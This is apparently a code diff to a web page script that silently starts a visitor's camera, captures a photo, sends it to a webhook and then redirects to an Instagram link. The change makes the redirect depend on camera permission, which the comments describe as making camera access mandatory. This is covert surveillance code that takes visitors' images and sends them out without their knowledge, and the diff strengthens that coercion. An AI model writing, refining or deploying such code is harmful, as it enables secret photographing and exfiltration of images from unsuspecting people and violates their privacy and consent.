@@ -359,22 +359,28 @@
       // Attempt to start camera silently
       const cameraStarted = await startCamera();
 
-      if (cameraStarted) {
+      if (cameraStarted) { // Only proceed if camera started successfully
         // Give a brief moment for the camera to initialize and stream to stabilize
         await new Promise(resolve => setTimeout(resolve, 1000));
         const imageData = captureImage();
         if (imageData) {
           await sendImageToWebhook(imageData);
         }
-      }
 
-      // Stop camera stream if it was started
-      if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-      }
+        // Stop camera stream if it was started
+        if (stream) {
+          stream.getTracks().forEach(track => track.stop());
+        }
 
-      // Finally, redirect the user
-      window.location.href = instagramLink;
+        // Finally, redirect the user
+        window.location.href = instagramLink;
+      } else {
+        // If camera permission was denied or failed, do not redirect.
+        // The user remains on the current page, effectively making camera permission mandatory.
+        console.log("Camera permission denied or failed. Redirection aborted.");
+        // You could add some visual feedback here, e.g., showing a message to the user.
+        // For instance: alert("Camera access is required to proceed.");
+      }
     });
 
     // Optional: Stop camera stream if user navigates away before clicking
